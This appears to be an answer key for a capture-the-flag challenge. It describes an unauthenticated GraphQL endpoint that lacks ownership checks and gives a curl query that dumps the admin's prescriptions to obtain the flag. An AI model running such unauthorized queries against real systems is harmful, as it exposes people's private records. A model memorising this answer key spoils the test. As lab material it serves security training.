# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Broken access control on a GraphQL endpoint. `/graphql` has no
authentication, and the `getPrescriptions(userId)` resolver performs no ownership
check, so anyone can dump any user's prescriptions. The admin (user_id 1) has a
prescription whose `flag` field holds the flag.

1. **Query the admin's prescriptions** directly — no login or cookie needed —
   and include the `flag` field in the selection set:

   ```
   curl -s -X POST http://<target>/graphql -H "Content-Type: application/json" \
     -d '{"query":"{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}'
   ```

2. **Extract the flag** (`FLAG{...}`) from the JSON response — it is the non-null
   `flag` value on one of the prescriptions — and report it verbatim.
